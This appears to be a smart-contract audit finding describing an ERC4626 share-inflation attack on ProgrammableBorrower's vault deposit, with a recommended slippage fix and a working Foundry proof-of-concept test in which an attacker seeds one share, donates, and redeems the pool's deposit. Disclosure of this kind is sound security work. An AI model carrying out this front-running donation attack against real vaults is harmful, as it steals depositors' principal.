### Title
Unvalidated ERC4626 deposit allows a vault shareholder to steal pool principal through share inflation - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower._depositToVault` accepts the ERC4626 share amount returned by `vault.deposit` without enforcing a nonzero or minimum expected amount. A vault shareholder can inflate the vault’s assets-per-share before `onStartEpoch`, causing the programmable borrower’s entire deposit to mint zero shares while the underlying remains in the external vault and becomes redeemable by the attacker. [1](#0-0) 

### Finding Description
During `startEpoch`, `IdleCDOEpochVariant` transfers the pool surplus to the borrower and then calls `onStartEpoch`. [2](#0-1)  `ProgrammableBorrower.onStartEpoch` snapshots the received balance as `epochStartVaultAssets`, then deposits the full on-hand balance into the configured ERC4626 vault. [3](#0-2) 

An attacker who already holds the vault’s only share can donate enough underlying to make the integer share calculation return zero for the programmable borrower’s deposit. `_depositToVault` emits the returned `shares` but never checks it, so the transaction succeeds even though the borrower receives no vault position. [1](#0-0) 

Afterwards, `_currentVaultAssets()` returns zero because the borrower holds zero shares. [4](#0-3)  The attacker’s dust share is now backed by both the donation and the pool deposit and can redeem the combined amount, while the programmable borrower has no way to recover the deposited principal. `setVault` validates only the vault address and asset, not share inflation resistance or deposit slippage. [5](#0-4) 

### Impact Explanation
The attacker can steal up to the full amount of idle pool principal transferred to the programmable borrower at epoch start. The vault inflation cost is returned to the attacker when they redeem their dust share, so their net profit is approximately the pool deposit amount.

The pool also becomes insolvent: `epochStartVaultAssets` remains set to the deposited principal, while `_currentVaultAssets()` is zero and `_vaultNetInterest()` reports the deposit as a vault loss. [6](#0-5)  Once LPs request withdrawals, `stopEpoch` cannot source the pending amount from the borrower’s nonexistent vault position; the subsequent borrower transfer fails and the CDO enters the default path. [7](#0-6) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to have a very small existing share supply and to allow deposits that round down to zero shares. Empty or newly initialized ERC4626 vaults satisfy this condition when they lack virtual-share inflation protection or minimum-share checks.

An unprivileged vault user can seed the vault with one share and front-run the manager’s `startEpoch` transaction with a donation. The attacker does not need to be the borrower, manager, owner, or vault administrator; ordinary ERC4626 deposit and donation transactions are sufficient.

### Recommendation
Validate every external vault deposit with slippage protection:

```solidity
uint256 expectedShares = vault.previewDeposit(_assetAmount);
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares == 0 || shares < expectedShares) revert InvalidAmount();
```

For integrations that can intentionally accept rounding loss, use an explicit `minSharesOut` bound derived from the pre-deposit vault state. Prefer ERC4626 vaults with virtual-share inflation protection and reject vaults whose current share supply or deposit mechanics allow attacker-controlled share-price inflation. Adding a post-deposit check that `convertToAssets(shares)` economically covers `_assetAmount` would further detect under-crediting vaults.

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ProgrammableBorrower} from
    "../contracts/strategies/idle/ProgrammableBorrower.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

// Minimal ERC4626-compatible vault with standard floor rounding and no
// virtual shares. It intentionally models a valid low-liquidity ERC4626.
contract InflatableVault is ERC20 {
    IERC20Detailed public immutable assetToken;

    constructor(IERC20Detailed asset_) ERC20("Vault Share", "VS") {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 assetsBefore = totalAssets();
        uint256 supply = totalSupply();
        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore;

        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract FakeCDO {
    IERC20Detailed public immutable token;
    ProgrammableBorrower public borrowerContract;

    constructor(IERC20Detailed token_) {
        token = token_;
    }

    function setBorrower(ProgrammableBorrower borrower_) external {
        borrowerContract = borrower_;
    }

    // Equivalent to IdleCDOEpochVariant: transfer pool funds to the borrower,
    // then invoke onStartEpoch().
    function startEpoch(uint256 amount) external {
        token.transfer(address(borrowerContract), amount);
        borrowerContract.onStartEpoch(0);
    }
}

contract ProgrammableBorrowerInflationTest is Test {
    IERC20Detailed constant USDC =
        IERC20Detailed(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testVaultShareInflationStealsEpochDeposit() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        InflatableVault vault = new InflatableVault(USDC);
        FakeCDO cdo = new FakeCDO(USDC);
        ProgrammableBorrower borrowerContract = new ProgrammableBorrower();

        cdo.setBorrower(borrowerContract);
        borrowerContract.initialize(
            address(vault),
            address(cdo),
            address(this),
            address(this),
            makeAddr("realBorrower"),
            0
        );

        address attacker = makeAddr("attacker");
        uint256 poolDeposit = 1_000_000e6;
        uint256 donation = poolDeposit;

        // Attacker creates a one-share vault position and inflates share price.
        deal(address(USDC), attacker, donation + 1);
        vm.startPrank(attacker);
        USDC.approve(address(vault), 1);
        vault.deposit(1, attacker);
        USDC.transfer(address(vault), donation);
        vm.stopPrank();

        // Epoch start: the CDO sends all surplus principal to the programmable
        // borrower, which deposits it into the inflated vault.
        deal(address(USDC), address(cdo), poolDeposit);
        cdo.startEpoch(poolDeposit);

        // poolDeposit * 1 / (donation + 1) rounds down to zero.
        assertEq(vault.balanceOf(address(borrowerContract)), 0);
        assertEq(borrowerContract.totalUnderlying(), 0);

        // The sole attacker share redeems donation + seed + the pool deposit.
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        assertEq(USDC.balanceOf(attacker), donation + 1 + poolDeposit);
    }
}
